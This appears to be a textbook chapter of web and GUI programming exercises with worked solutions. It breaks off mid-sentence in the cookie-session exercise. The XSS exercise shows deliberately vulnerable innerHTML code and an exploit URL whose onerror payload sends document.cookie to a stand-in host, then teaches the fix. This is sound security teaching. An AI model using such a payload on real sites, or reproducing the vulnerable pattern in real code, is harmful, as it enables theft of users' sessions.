# Chapter 42 · Exercises

Web and GUI work is learned by breaking things and looking at what happened.
Two of these exercises ask you to **predict output before running anything** —
do that honestly, because the gap between your prediction and the printed
answer is the whole lesson. The HTML, CSS, and JavaScript here should be saved
to files and opened in a browser; every solution also contains a runnable
Python model so you can check your reasoning without leaving this page. The
last exercise adds real login sessions to the server you built in
[42.2](02-http-server.md).

### Exercise 42.1 — Fix broken, inaccessible HTML ●

This fragment has six defects: some make it invalid, some make it unusable for
someone who cannot see the screen. Find them all, then rewrite it.

```html
<div class="card">
  <h1>Teahouse</h1>
  <h3>Sign up</h3>
  <p>Enter your email
  <img src="cup.png">
  <input type="text" name="email" placeholder="Email">
  <div onclick="submitForm()">Send</div>
</div>
```

??? success "Solution"

    The six defects: the heading level **skips** from `h1` to `h3`; the `<p>`
    is **never closed**; the image has **no `alt`**; the input has **no
    `<label>`** (and no `id` for one to point at — `placeholder` is not a
    label, it vanishes the moment the user types); the submit control is a
    **`<div>`**, which cannot be focused or activated with the keyboard and is
    announced as nothing; and there is **no `<form>`**, so pressing ++enter++
    in the field does nothing and the browser's own validation never runs.

    Here is the corrected markup — save it and open it:

    ```html
    <section class="card">
      <h1>Teahouse</h1>
      <h2>Sign up</h2>
      <p>Enter your email.</p>
      <img src="cup.png" alt="A cup of green tea on a wooden tray">
      <form action="/subscribe" method="post">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required>
        <button type="submit">Send</button>
      </form>
    </section>
    ```

    And here is a checker that finds those defects mechanically, using the
    parser from [42.1](01-html-css.md):

    ```python
    from html.parser import HTMLParser

    VOID = {"br", "hr", "img", "input", "link", "meta", "source"}


    class Node:
        def __init__(self, tag, attrs=()):
            self.tag, self.attrs = tag, dict(attrs)
            self.children, self.parent = [], None

        def __repr__(self):
            bits = "".join(f' {k}="{v}"' for k, v in self.attrs.items())
            return f"<{self.tag}{bits}>"


    class Builder(HTMLParser):
        def __init__(self):
            super().__init__(convert_charrefs=True)
            self.root = Node("#document")
            self.open = [self.root]
            self.unclosed = []

        def handle_starttag(self, tag, attrs):
            node = Node(tag, attrs)
            node.parent = self.open[-1]
            self.open[-1].children.append(node)
            if tag not in VOID:
                self.open.append(node)

        def handle_endtag(self, tag):
            for i in range(len(self.open) - 1, 0, -1):
                if self.open[i].tag == tag:
                    self.unclosed += [n.tag for n in self.open[i + 1:]]
                    del self.open[i:]
                    return

        def close(self):
            super().close()
            self.unclosed += [n.tag for n in self.open[1:]]   # still open at EOF


    def walk(node):
        for child in node.children:
            yield child
            yield from walk(child)


    def audit(html):
        b = Builder()
        b.feed(html)
        b.close()
        problems = []
        elements = list(walk(b.root))
        labelled = {e.attrs.get("for") for e in elements if e.tag == "label"}

        for e in elements:
            if e.tag == "img" and "alt" not in e.attrs:
                problems.append(f"{e!r} has no alt text")
            if e.tag in {"input", "select", "textarea"}:
                if e.attrs.get("id") not in labelled:
                    problems.append(f"{e!r} has no <label for=...>")
            if "onclick" in e.attrs and e.tag not in {"button", "a"}:
                problems.append(f"{e!r} is clickable but not a button or link")
            if e.tag in {"input", "button"} and not any(
                    p.tag == "form" for p in iter_parents(e)):
                problems.append(f"{e!r} is not inside a <form>")

        levels = [int(e.tag[1]) for e in elements if e.tag in {f"h{i}" for i in range(1, 7)}]
        for before, after in zip(levels, levels[1:]):
            if after > before + 1:
                problems.append(f"heading level jumps from h{before} to h{after}")

        for tag in b.unclosed:
            problems.append(f"<{tag}> was never closed")
        return problems


    def iter_parents(node):
        node = node.parent
        while node is not None:
            yield node
            node = node.parent


    BROKEN = """
    <div class="card">
      <h1>Teahouse</h1>
      <h3>Sign up</h3>
      <p>Enter your email
      <img src="cup.png">
      <input type="text" name="email" placeholder="Email">
      <div onclick="submitForm()">Send</div>
    </div>
    """

    FIXED = """
    <section class="card">
      <h1>Teahouse</h1>
      <h2>Sign up</h2>
      <p>Enter your email.</p>
      <img src="cup.png" alt="A cup of green tea on a wooden tray">
      <form action="/subscribe" method="post">
        <label for="email">Email address</label>
        <input type="email" id="email" name="email" required>
        <button type="submit">Send</button>
      </form>
    </section>
    """

    print("BROKEN:")
    for problem in audit(BROKEN):
        print("  -", problem)
    print()
    print("FIXED :", audit(FIXED) or "no problems found")
    ```

    ```text
    BROKEN:
      - <img src="cup.png"> has no alt text
      - <input type="text" name="email" placeholder="Email"> has no <label for=...>
      - <input type="text" name="email" placeholder="Email"> is not inside a <form>
      - <div onclick="submitForm()"> is clickable but not a button or link
      - heading level jumps from h1 to h3
      - <p> was never closed

    FIXED : no problems found
    ```

    Notice what the checker cannot do: it cannot tell you whether your `alt`
    text is *good*, only that it exists. Automated tools catch perhaps a third
    of accessibility defects; the rest need the keyboard test from the
    checklist in [42.1](01-html-css.md).

### Exercise 42.2 — Predict which rule wins ●

**Write your answer down before running anything.** Given this element:

```html
<article id="intro">
  <p class="note">Steep gently.</p>
</article>
```

…and this stylesheet, what colour is the paragraph?

```css
p              { color: black; }
.note          { color: blue; }
article p      { color: green; }
article .note  { color: orange; }
#intro .note   { color: red; }
article p.note { color: purple; }
```

Then answer the follow-up: what happens if you add `p { color: teal !important; }`
at the very top of the file?

??? success "Solution"

    **Red**, from `#intro .note`. Specificity is `(ids, classes, elements)`
    compared left to right with no carrying, so one id beats every rule without
    one — `#intro .note` scores `(1, 1, 0)` and the nearest rival,
    `article p.note`, scores only `(0, 1, 2)`. Source order never enters into
    it, because there is no tie.

    The follow-up: **teal**. `!important` sits outside the specificity system
    entirely, so a `!important` declaration on a bare `p` beats a non-important
    id rule regardless of position. That is exactly why `!important` is a trap:
    the only way to override it is another `!important`, and now two rules are
    in an arms race.

    ```python
    import re

    COMPOUND = re.compile(r"^(?P<tag>[a-zA-Z][\w-]*|\*)?(?P<hooks>(?:[.#][\w-]+)*)$")


    def specificity(selector):
        ids = classes = tags = 0
        for piece in selector.split():
            m = COMPOUND.match(piece)
            hooks = m.group("hooks")
            ids += len(re.findall(r"#[\w-]+", hooks))
            classes += len(re.findall(r"\.[\w-]+", hooks))
            if m.group("tag") not in (None, "*"):
                tags += 1
        return (ids, classes, tags)


    RULES = [("p", "black"), (".note", "blue"), ("article p", "green"),
             ("article .note", "orange"), ("#intro .note", "red"),
             ("article p.note", "purple")]

    print(f"{'selector':<16}{'specificity':<14}colour")
    for selector, colour in RULES:
        print(f"{selector:<16}{str(specificity(selector)):<14}{colour}")

    winner = max(RULES, key=lambda rule: specificity(rule[0]))
    print()
    print("winner:", winner[0], "->", winner[1])
    print("with p { color: teal !important; } added -> teal "
          "(!important is outside the specificity system)")
    ```

    ```text
    selector        specificity   colour
    p               (0, 0, 1)     black
    .note           (0, 1, 0)     blue
    article p       (0, 0, 2)     green
    article .note   (0, 1, 1)     orange
    #intro .note    (1, 1, 0)     red
    article p.note  (0, 1, 2)     purple

    winner: #intro .note -> red
    with p { color: teal !important; } added -> teal (!important is outside the specificity system)
    ```

### Exercise 42.3 — Parse a raw HTTP request by hand ●●

Here is a request exactly as it arrives on the wire (`\r\n` shown as line
breaks). **On paper**, write down: the method, the path, the query parameters
as a dictionary, the value of the `Host` header, the content type, and the
body. Then run the solution to check yourself.

```text
POST /api/notes?draft=true&notify=yes HTTP/1.1
Host: teahouse.example:8443
CONTENT-TYPE: application/json; charset=utf-8
Content-Length: 31
Cookie: session=8f3a91c0

{"text": "Oolong, 90 C, 3 minutes"}
```

Three traps are deliberate: one header's name is shouted, the path and the
query string are easy to run together, and one header is telling a lie.

??? success "Solution"

    Method `POST`; path `/api/notes` (**not** including the query string);
    query `{'draft': 'true', 'notify': 'yes'}`; host
    `teahouse.example:8443` — the port travels *inside* the `Host` header
    value; content type `application/json; charset=utf-8`, found by looking up
    `content-type` after lower-casing, because header names are
    case-insensitive; body the JSON text.

    ```python
    from urllib.parse import urlsplit, parse_qs

    RAW = ("POST /api/notes?draft=true&notify=yes HTTP/1.1\r\n"
           "Host: teahouse.example:8443\r\n"
           "CONTENT-TYPE: application/json; charset=utf-8\r\n"
           "Content-Length: 31\r\n"
           "Cookie: session=8f3a91c0\r\n"
           "\r\n"
           '{"text": "Oolong, 90 C, 3 minutes"}')

    head, _, body = RAW.partition("\r\n\r\n")
    lines = head.split("\r\n")
    method, target, version = lines[0].split(" ")

    headers = {}
    for line in lines[1:]:
        name, _, value = line.partition(":")
        headers[name.strip().lower()] = value.strip()

    url = urlsplit(target)
    print("method      :", method)
    print("path        :", url.path)
    print("query       :", {k: v[0] for k, v in parse_qs(url.query).items()})
    print("version     :", version)
    print("host        :", headers["host"])
    print("content-type:", headers["content-type"])
    print("cookies     :", dict(c.split("=", 1) for c in headers["cookie"].split("; ")))
    print("body        :", body)
    print()
    print("declared Content-Length:", headers["content-length"])
    print("actual body bytes      :", len(body.encode("utf-8")))
    print("they disagree — a real server would read only the declared number of bytes")
    ```

    ```text
    method      : POST
    path        : /api/notes
    query       : {'draft': 'true', 'notify': 'yes'}
    version     : HTTP/1.1
    host        : teahouse.example:8443
    content-type: application/json; charset=utf-8
    cookies     : {'session': '8f3a91c0'}
    body        : {"text": "Oolong, 90 C, 3 minutes"}

    declared Content-Length: 31
    actual body bytes      : 35
    they disagree — a real server would read only the declared number of bytes
    ```

    The last three lines are the trap worth remembering: `Content-Length` is
    what the reader trusts. If it is wrong, the server either truncates your
    body or blocks waiting for bytes that never arrive — which is why you
    compute it from the encoded bytes rather than typing it.

### Exercise 42.4 — Add a route with a path parameter ●●

Extend the router from [42.2](02-http-server.md) with a steeping endpoint:

```text
GET /api/teas/{name}/steep/{minutes:int}
```

It should answer `200` with JSON `{"tea": …, "minutes": …, "verdict": …}` where
the verdict is `"under"` below 2 minutes, `"good"` from 2 to 5, and `"bitter"`
above 5. A non-numeric `minutes` must **not** reach the handler — the router
should reject it, giving a `404`.

??? success "Solution"

    The whole trick is in `template_to_regex`: `{minutes:int}` becomes
    `(?P<minutes>\d+)` and `{name}` becomes `(?P<name>[^/]+)`, so
    `/api/teas/oolong/steep/three` never matches any route and falls through to
    the 404 branch. Validation happens in the pattern, before your code runs.

    ```python
    import json
    import re
    from dataclasses import dataclass, field
    from urllib.parse import urlsplit, parse_qs

    PARAM = re.compile(r"\{(\w+)(?::(int))?\}")


    def template_to_regex(template):
        def replace(m):
            piece = r"\d+" if m.group(2) == "int" else r"[^/]+"
            return f"(?P<{m.group(1)}>{piece})"
        return re.compile("^" + PARAM.sub(replace, template) + "$")


    @dataclass
    class Request:
        method: str
        path: str
        query: dict = field(default_factory=dict)


    @dataclass
    class Response:
        status: int
        body: str


    class Router:
        def __init__(self):
            self.routes = []

        def route(self, method, template):
            pattern = template_to_regex(template)
            def register(handler):
                self.routes.append((method, pattern, handler))
                return handler
            return register

        def dispatch(self, request):
            for method, pattern, handler in self.routes:
                m = pattern.match(request.path)
                if m and method == request.method:
                    params = {k: int(v) if v.isdigit() else v
                              for k, v in m.groupdict().items()}
                    return handler(request, params)
            return Response(404, json.dumps({"error": f"no route for {request.path}"}))


    app = Router()


    @app.route("GET", "/api/teas/{name}/steep/{minutes:int}")
    def steep(request, params):
        minutes = params["minutes"]
        verdict = "under" if minutes < 2 else "good" if minutes <= 5 else "bitter"
        return Response(200, json.dumps({"tea": params["name"],
                                         "minutes": minutes,
                                         "verdict": verdict}))


    print(f"{'GET path':<38}{'status':<8}body")
    for path in ["/api/teas/oolong/steep/3",
                 "/api/teas/green/steep/1",
                 "/api/teas/black/steep/9",
                 "/api/teas/oolong/steep/three",     # not digits -> no match
                 "/api/teas/oolong/steep/3/extra"]:  # extra segment -> no match
        response = app.dispatch(Request("GET", path))
        print(f"{path:<38}{response.status:<8}{response.body}")
    ```

    ```text
    GET path                              status  body
    /api/teas/oolong/steep/3              200     {"tea": "oolong", "minutes": 3, "verdict": "good"}
    /api/teas/green/steep/1               200     {"tea": "green", "minutes": 1, "verdict": "under"}
    /api/teas/black/steep/9               200     {"tea": "black", "minutes": 9, "verdict": "bitter"}
    /api/teas/oolong/steep/three          404     {"error": "no route for /api/teas/oolong/steep/three"}
    /api/teas/oolong/steep/3/extra        404     {"error": "no route for /api/teas/oolong/steep/3/extra"}
    ```

    The last case is why the template compiles to `[^/]+` rather than `.+`: a
    path parameter must stop at the next slash, or `/api/teas/oolong/steep/3/extra`
    would match with `minutes` swallowing the rest of the path. That is the
    negated-character-class lesson from
    [41.2](../ch41-regex/02-groups-parsing.md), doing real work.

### Exercise 42.5 — Predict the event-loop order ●●

**Write the output down before running anything.** In what order do the letters
appear in the browser console?

```javascript
console.log("A");

setTimeout(() => console.log("B"), 0);

Promise.resolve().then(() => {
  console.log("C");
  setTimeout(() => console.log("D"), 0);
});

setTimeout(() => {
  console.log("E");
  Promise.resolve().then(() => console.log("F"));
}, 0);

console.log("G");
```

??? success "Solution"

    **A G C B E F D.**

    Synchronous code first and in full: `A`, `G`. Then the microtask queue is
    drained: `C` runs, and it *schedules* a timer for `D` — which goes to the
    back of the task queue, behind `B` and `E`, which were registered earlier.
    Then one task at a time, draining microtasks after each: `B`; then `E`,
    which queues a microtask, so `F` runs immediately after `E` and **before**
    `D`, even though `D`'s timer was created first. Finally `D`.

    The model from [42.3](03-javascript.md) reproduces it exactly:

    ```python
    import heapq
    from collections import deque

    LOG = []


    class EventLoop:
        def __init__(self):
            self.clock, self.order = 0, 0
            self.timers, self.microtasks = [], deque()

        def set_timeout(self, fn, delay, label):
            self.order += 1
            heapq.heappush(self.timers, (self.clock + delay, self.order, label, fn))

        def queue_microtask(self, fn, label):
            self.microtasks.append((label, fn))

        def drain(self):
            while self.microtasks:
                label, fn = self.microtasks.popleft()
                print(f"  microtask {label}")
                fn()

        def run(self, script):
            print("  synchronous script")
            script()
            self.drain()
            while self.timers:
                _due, _order, label, fn = heapq.heappop(self.timers)
                print(f"  task      {label}")
                fn()
                self.drain()


    loop = EventLoop()


    def log(letter):
        LOG.append(letter)
        print(f"        log: {letter}")


    def script():
        log("A")
        loop.set_timeout(lambda: log("B"), 0, "timer B")

        def then_c():
            log("C")
            loop.set_timeout(lambda: log("D"), 0, "timer D")

        loop.queue_microtask(then_c, "then C")

        def timer_e():
            log("E")
            loop.queue_microtask(lambda: log("F"), "then F")

        loop.set_timeout(timer_e, 0, "timer E")
        log("G")


    loop.run(script)
    print()
    print("order:", " ".join(LOG))
    print("matches the browser:", " ".join(LOG) == "A G C B E F D")
    ```

    ```text
      synchronous script
            log: A
            log: G
      microtask then C
            log: C
      task      timer B
            log: B
      task      timer E
            log: E
      microtask then F
            log: F
      task      timer D
            log: D

    order: A G C B E F D
    matches the browser: True
    ```

    The rule that decides everything: **the microtask queue is drained
    completely after every task**, and a `setTimeout` scheduled from inside a
    microtask still goes to the *back* of the task queue.

### Exercise 42.6 — Find the XSS and fix it ●●

This function renders search results. It contains a cross-site scripting
vulnerability. Where is it, what URL exploits it, and how do you fix it?

```javascript
function showResults(items) {
  const q = new URLSearchParams(location.search).get("q");
  document.querySelector("#results").innerHTML =
    `<h2>Results for ${q}</h2><ul>` +
    items.map(i => `<li>${i.title}</li>`).join("") +
    `</ul>`;
}
```

??? success "Solution"

    Both `${q}` and `${i.title}` are interpolated into a string that is then
    parsed as HTML by `innerHTML`. `q` comes straight from the URL, so an
    attacker chooses its contents; `i.title` comes from the server, which
    means it ultimately came from some other user. Either is enough.

    The exploit URL:

    ```text
    https://teahouse.example/search?q=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
    ```

    `<script>` tags inserted by `innerHTML` do *not* execute — which is why
    people wrongly believe `innerHTML` is safe — but an `onerror` attribute on
    a deliberately broken image does, and it runs with full access to the page,
    including `document.cookie`.

    The fix is to stop treating data as markup:

    ```javascript
    function showResults(items) {
      const q = new URLSearchParams(location.search).get("q") ?? "";
      const box = document.querySelector("#results");
      box.textContent = "";                     // clear, without parsing anything

      const heading = document.createElement("h2");
      heading.textContent = `Results for ${q}`; // text stays text
      box.append(heading);

      const list = document.createElement("ul");
      for (const item of items) {
        const li = document.createElement("li");
        li.textContent = item.title;            // ditto
        list.append(li);
      }
      box.append(list);
    }
    ```

    Here is the difference made visible, by parsing both results with the DOM
    builder from [42.1](01-html-css.md) and looking at what elements exist:

    ```python
    import html
    from html.parser import HTMLParser

    PAYLOAD = '<img src=x onerror="steal(document.cookie)">'


    class Scan(HTMLParser):
        def __init__(self):
            super().__init__(convert_charrefs=True)
            self.elements, self.text = [], []

        def handle_starttag(self, tag, attrs):
            self.elements.append((tag, dict(attrs)))

        def handle_data(self, data):
            if data.strip():
                self.text.append(data.strip())


    def inspect(label, markup):
        s = Scan()
        s.feed(markup)
        s.close()
        print(label)
        print("   markup   :", markup)
        print("   elements :", s.elements)
        print("   text     :", s.text)
        dangerous = [t for t, a in s.elements
                     if any(k.startswith("on") for k in a)]
        print("   verdict  :", "EXECUTES" if dangerous else "inert text", dangerous or "")
        print()


    # 1. innerHTML: the payload is PARSED, so it becomes a real element
    inspect("innerHTML  = `<h2>Results for ${q}</h2>`",
            f"<h2>Results for {PAYLOAD}</h2>")

    # 2. textContent: the payload is escaped, so it stays characters on screen
    inspect("textContent = `Results for ${q}`",
            f"<h2>Results for {html.escape(PAYLOAD)}</h2>")

    print("html.escape turns the dangerous characters into entities:")
    print("  ", html.escape('<img src=x onerror="x">'))
    ```

    ```text
    innerHTML  = `<h2>Results for ${q}</h2>`
       markup   : <h2>Results for <img src=x onerror="steal(document.cookie)"></h2>
       elements : [('h2', {}), ('img', {'src': 'x', 'onerror': 'steal(document.cookie)'})]
       text     : ['Results for']
       verdict  : EXECUTES ['img']

    textContent = `Results for ${q}`
       markup   : <h2>Results for &lt;img src=x onerror=&quot;steal(document.cookie)&quot;&gt;</h2>
       elements : [('h2', {})]
       text     : ['Results for <img src=x onerror="steal(document.cookie)">']
       verdict  : inert text

    html.escape turns the dangerous characters into entities:
       &lt;img src=x onerror=&quot;x&quot;&gt;
    ```

    Two closing points. `html.escape` shows what a template engine or
    `textContent` does for you — `<` becomes `&lt;`, so the browser sees
    characters rather than a tag. And escaping is only half the defence: a
    session cookie marked `HttpOnly` ([42.2](02-http-server.md)) is invisible
    to `document.cookie`, so even a successful injection cannot steal the
    session. Defences stack.

### Exercise 42.7 — Add a widget and a handler ●●

Take the GUI engine from [42.4](04-desktop-gui.md) and add two things: a
**reset** button that returns the count to zero, and a **status label** bound to
a second piece of state that reports what happened last. Confirm that clicking
reset when the count is already zero marks nothing dirty and triggers no
repaint.

??? success "Solution"

    A trimmed version of the engine — column layout only, which is all this
    needs — with the two additions. The important part is that the new widget
    required **no** changes to `layout`, `render`, `hit_test`, or `dispatch`:
    a widget tree is a
    [composite structure](../ch13-design/03-multi-class.md), so adding a node
    is adding data, not code.

    ```python
    from dataclasses import dataclass, field

    W, H = 30, 6


    @dataclass
    class Widget:
        name: str
        kind: str
        text: str = ""
        children: list = field(default_factory=list)
        handlers: dict = field(default_factory=dict)
        parent: object = None
        x: int = 0
        y: int = 0
        w: int = 0
        h: int = 0

        def add(self, *kids):
            for kid in kids:
                kid.parent = self
                self.children.append(kid)
            return self


    def label_width(widget):
        return len(widget.text) + (4 if widget.kind == "button" else 0)


    def layout(root):
        """One column, one row per child, starting at (1, 1)."""
        root.x, root.y, root.w, root.h = 0, 0, W, H
        for i, child in enumerate(root.children):
            child.x, child.y = 1, 1 + i
            child.w, child.h = label_width(child), 1


    def render(root):
        grid = [[" "] * W for _ in range(H)]
        for child in root.children:
            text = f"[ {child.text} ]" if child.kind == "button" else child.text
            for i, ch in enumerate(text):
                if child.x + i < W:
                    grid[child.y][child.x + i] = ch
        print("   " + "".join(str(i % 10) for i in range(W)))
        for r, row in enumerate(grid):
            print(f"{r:>2} " + "".join(row).rstrip())


    def hit_test(root, px, py):
        for child in reversed(root.children):
            if child.x <= px < child.x + child.w and child.y <= py < child.y + child.h:
                return child
        return root if 0 <= px < W and 0 <= py < H else None


    def dispatch(root, px, py):
        target = hit_test(root, px, py)
        print(f"  click ({px},{py}) -> {target.name if target else 'nothing'}")
        node = target
        while node is not None:
            handler = node.handlers.get("click")
            if handler is not None:
                print(f"     handler on {node.name}")
                if handler(node) == "stop":
                    return
            node = node.parent


    class State:
        def __init__(self, **values):
            self.values, self.bindings, self.dirty = dict(values), [], set()

        def bind(self, key, widget, fmt):
            self.bindings.append((key, widget, fmt))
            widget.text = fmt(self.values[key])

        def set(self, key, value):
            if self.values[key] == value:
                return                             # unchanged: nothing to repaint
            self.values[key] = value
            for k, widget, fmt in self.bindings:
                if k == key:
                    widget.text = fmt(value)
                    self.dirty.add(widget.name)


    count = Widget("count", "label")
    status = Widget("status", "label")                      # NEW widget
    plus = Widget("plus", "button", "+")
    reset = Widget("reset", "button", "reset")              # NEW widget
    window = Widget("window", "panel").add(count, status, plus, reset)

    state = State(cups=0, last="ready")
    state.bind("cups", count, lambda n: f"cups poured: {n}")
    state.bind("last", status, lambda s: f"last action: {s}")


    def on_plus(widget):
        state.set("cups", state.values["cups"] + 1)
        state.set("last", "added a cup")
        return "stop"


    def on_reset(widget):                                   # NEW handler
        state.set("cups", 0)
        state.set("last", "reset")
        return "stop"


    plus.handlers["click"] = on_plus
    reset.handlers["click"] = on_reset

    layout(window)
    render(window)

    for px, py in [(2, 3), (2, 3), (4, 4), (4, 4)]:   # plus, plus, reset, reset again
        print()
        dispatch(window, px, py)
        if state.dirty:
            print("     dirty:", sorted(state.dirty), "-> repaint")
            state.dirty.clear()
            layout(window)
            render(window)
        else:
            print("     nothing dirty -> no repaint")
    ```

    ```text
       012345678901234567890123456789
     0
     1  cups poured: 0
     2  last action: ready
     3  [ + ]
     4  [ reset ]
     5

      click (2,3) -> plus
         handler on plus
         dirty: ['count', 'status'] -> repaint
       012345678901234567890123456789
     0
     1  cups poured: 1
     2  last action: added a cup
     3  [ + ]
     4  [ reset ]
     5

      click (2,3) -> plus
         handler on plus
         dirty: ['count'] -> repaint
       012345678901234567890123456789
     0
     1  cups poured: 2
     2  last action: added a cup
     3  [ + ]
     4  [ reset ]
     5

      click (4,4) -> reset
         handler on reset
         dirty: ['count', 'status'] -> repaint
       012345678901234567890123456789
     0
     1  cups poured: 0
     2  last action: reset
     3  [ + ]
     4  [ reset ]
     5

      click (4,4) -> reset
         handler on reset
         nothing dirty -> no repaint
    ```

    The **second** click is already instructive: only `count` is dirty, because
    `last` was set to the string it already held and `State.set` returned
    early. The fourth click is the one to study: resetting an already-zero counter
    sets `cups` to the value it already has, so `State.set` returns early and
    marks nothing dirty — but `last` *does* change from `"reset"` to `"reset"`…
    which is also unchanged, so that returns early too. No repaint. That
    early-return guard is what stops a real toolkit redrawing the window sixty
    times a second for nothing.

### Exercise 42.8 — Cookie-based sessions ●●●

Extend the runnable server from [42.2](02-http-server.md) so that it can log a
user in and out across separate requests. You need four pieces:

1. a **cookie parser** that turns `Cookie: session=abc; theme=dark` into a dict;
2. a **session store** — a dictionary from a random session id to a user;
3. a **session middleware** that looks up the cookie's session id, attaches the
   user to the request, and returns `401` for a protected path when there is
   none;
4. `POST /login`, `GET /account`, and `POST /logout` handlers that set and clear
   the cookie with `Set-Cookie`.

Drive it with six hand-written requests that demonstrate the whole cycle,
including the fact that the cookie stops working after logout. Seed the
randomness so the output is reproducible.

??? success "Solution"

    ```python
    import json
    import random
    import re
    from dataclasses import dataclass, field
    from urllib.parse import urlsplit, parse_qs

    random.seed(42)                       # reproducible session ids

    # ------------------------------------------------------------ request
    @dataclass
    class Request:
        method: str
        path: str
        query: dict
        headers: dict
        body: str
        user: str = None                  # filled in by the session middleware

        def header(self, name, default=None):
            return self.headers.get(name.lower(), default)

        def cookies(self):
            raw = self.header("cookie", "")
            jar = {}
            for piece in raw.split(";"):
                name, sep, value = piece.strip().partition("=")
                if sep:
                    jar[name] = value
            return jar


    def parse_request(raw):
        head, _, body = raw.partition("\r\n\r\n")
        lines = head.split("\r\n")
        method, target, _version = lines[0].split(" ")
        headers = {}
        for line in lines[1:]:
            name, sep, value = line.partition(":")
            if sep:
                headers[name.strip().lower()] = value.strip()
        url = urlsplit(target)
        return Request(method, url.path or "/",
                       {k: v[0] for k, v in parse_qs(url.query).items()},
                       headers, body)


    # ----------------------------------------------------------- response
    REASON = {200: "OK", 303: "See Other", 400: "Bad Request",
              401: "Unauthorized", 404: "Not Found"}


    @dataclass
    class Response:
        status: int = 200
        headers: dict = field(default_factory=dict)
        body: str = ""

        def wire(self):
            head = [f"HTTP/1.1 {self.status} {REASON.get(self.status, 'Unknown')}"]
            for name, value in self.headers.items():
                head.append(f"{name}: {value}")
            head.append(f"Content-Length: {len(self.body.encode('utf-8'))}")
            return "\r\n".join(head) + "\r\n\r\n" + self.body


    # ------------------------------------------------------------- router
    PARAM = re.compile(r"\{(\w+)(?::(int))?\}")


    def template_to_regex(template):
        def replace(m):
            piece = r"\d+" if m.group(2) == "int" else r"[^/]+"
            return f"(?P<{m.group(1)}>{piece})"
        return re.compile("^" + PARAM.sub(replace, template) + "$")


    class Router:
        def __init__(self):
            self.routes = []

        def route(self, method, template):
            pattern = template_to_regex(template)
            def register(handler):
                self.routes.append((method, pattern, handler))
                return handler
            return register

        def resolve(self, request):
            for method, pattern, handler in self.routes:
                if pattern.match(request.path) and method == request.method:
                    return handler
            return None


    app = Router()

    # ------------------------------------------------- the session store
    USERS = {"ada@example.org": "analytical"}      # a real one stores password HASHES
    SESSIONS = {}                                  # session id -> email
    PROTECTED = ("/account",)


    def new_session_id():
        return "".join(random.choice("0123456789abcdef") for _ in range(8))


    # -------------------------------------------------------- middleware
    def session_middleware(next_handler):
        def wrapped(request):
            sid = request.cookies().get("session")
            request.user = SESSIONS.get(sid)
            if request.path in PROTECTED and request.user is None:
                return Response(401, {"Content-Type": "text/plain"},
                                "please log in")            # short-circuit
            return next_handler(request)
        return wrapped


    def logging_middleware(next_handler):
        def wrapped(request):
            response = next_handler(request)
            who = request.user or "-"
            LOG.append(f"{request.method} {request.path} [{who}] -> {response.status}")
            return response
        return wrapped


    LOG = []
    MIDDLEWARE = [logging_middleware, session_middleware]


    # ---------------------------------------------------------- handlers
    @app.route("POST", "/login")
    def login(request):
        try:
            creds = json.loads(request.body)
        except json.JSONDecodeError:
            return Response(400, {}, "invalid JSON")
        email, password = creds.get("email"), creds.get("password")
        if USERS.get(email) != password:
            return Response(401, {}, "bad credentials")     # same message either way
        sid = new_session_id()
        SESSIONS[sid] = email
        return Response(303, {
            "Location": "/account",
            "Set-Cookie": f"session={sid}; Path=/; HttpOnly; Secure; SameSite=Lax",
        }, "")


    @app.route("GET", "/account")
    def account(request):
        return Response(200, {"Content-Type": "application/json"},
                        json.dumps({"user": request.user,
                                    "sessions_open": len(SESSIONS)}))


    @app.route("POST", "/logout")
    def logout(request):
        sid = request.cookies().get("session")
        SESSIONS.pop(sid, None)                              # server-side revocation
        return Response(303, {
            "Location": "/",
            "Set-Cookie": "session=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Lax",
        }, "")


    def handle(raw):
        request = parse_request(raw)
        handler = app.resolve(request)
        if handler is None:
            def handler(request):
                return Response(404, {}, f"no route for {request.path}")
        chain = handler
        for layer in reversed(MIDDLEWARE):
            chain = layer(chain)
        return chain(request).wire()


    # ------------------------------------------------------- the session
    def show(title, raw):
        wire = handle(raw)
        status = wire.split("\r\n")[0]
        cookie = [h for h in wire.split("\r\n") if h.startswith("Set-Cookie")]
        body = wire.split("\r\n\r\n")[1]
        print(f"{title}\n   {status}")
        if cookie:
            print("   " + cookie[0])
        if body:
            print("   body:", body)
        print()
        return wire


    show("1. GET /account with no cookie",
         "GET /account HTTP/1.1\r\nHost: teahouse.example\r\n\r\n")

    wire = show("2. POST /login with the right password",
                "POST /login HTTP/1.1\r\nHost: teahouse.example\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"email": "ada@example.org", "password": "analytical"}')

    # the browser now stores what the server sent, and echoes it back
    set_cookie = [h for h in wire.split("\r\n") if h.startswith("Set-Cookie")][0]
    jar = set_cookie.split(":", 1)[1].split(";")[0].strip()
    print(f"   (the browser will now send  Cookie: {jar})\n")

    show("3. GET /account with the cookie",
         f"GET /account HTTP/1.1\r\nHost: teahouse.example\r\nCookie: {jar}\r\n\r\n")

    show("4. POST /logout",
         f"POST /logout HTTP/1.1\r\nHost: teahouse.example\r\nCookie: {jar}\r\n\r\n")

    show("5. GET /account with the SAME cookie, after logout",
         f"GET /account HTTP/1.1\r\nHost: teahouse.example\r\nCookie: {jar}\r\n\r\n")

    show("6. POST /login with the wrong password",
         "POST /login HTTP/1.1\r\nHost: teahouse.example\r\n"
         "Content-Type: application/json\r\n\r\n"
         '{"email": "ada@example.org", "password": "guess"}')

    print("access log:")
    for line in LOG:
        print("   ", line)
    ```

    ```text
    1. GET /account with no cookie
       HTTP/1.1 401 Unauthorized
       body: please log in

    2. POST /login with the right password
       HTTP/1.1 303 See Other
       Set-Cookie: session=30877432; Path=/; HttpOnly; Secure; SameSite=Lax

       (the browser will now send  Cookie: session=30877432)

    3. GET /account with the cookie
       HTTP/1.1 200 OK
       body: {"user": "ada@example.org", "sessions_open": 1}

    4. POST /logout
       HTTP/1.1 303 See Other
       Set-Cookie: session=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Lax

    5. GET /account with the SAME cookie, after logout
       HTTP/1.1 401 Unauthorized
       body: please log in

    6. POST /login with the wrong password
       HTTP/1.1 401 Unauthorized
       body: bad credentials

    access log:
        GET /account [-] -> 401
        POST /login [-] -> 303
        GET /account [ada@example.org] -> 200
        POST /logout [ada@example.org] -> 303
        GET /account [-] -> 401
        POST /login [-] -> 401
    ```

    Four things that solution gets right, and that a first attempt usually
    does not.

    **The cookie is meaningless on its own.** It holds a random id; every fact
    about the user lives in `SESSIONS` on the server. That is what makes step 5
    work: after logout the id is gone from the store, so the very same cookie
